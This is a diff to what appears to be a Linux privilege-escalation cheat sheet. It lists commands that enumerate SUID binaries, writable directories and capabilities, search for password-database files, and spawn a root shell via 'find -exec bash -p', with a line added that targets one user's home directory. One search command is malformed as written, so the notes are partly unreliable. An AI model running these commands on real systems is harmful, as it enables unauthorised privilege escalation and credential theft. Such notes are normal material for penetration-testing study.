@@ -98,11 +98,12 @@ env
 # Files with SUID bit
 find / -perm -u=s -type f 2>/dev/null
 # Directories with writable permissions
-find / -writeable -type d 2>/dev/null
+find /var -writeable -type d 2>/dev/null
 # Look for useful files
 find / -type f -name -o -name "*.txt" -o -name "*.kdbx" -o -name "*.zip" 2>/dev/null
 # Files that may give you have +x
 find /home/<user> -exec "/usr/bin/bash" -p \;
+find /home/anita -exec "/usr/bin/bash" -p \;
 # Manually Enumerating Capabilities
 /usr/sbin/getcap -r / 2>/dev/null
 # List commands that user can run as sudo  - >  GTFObins
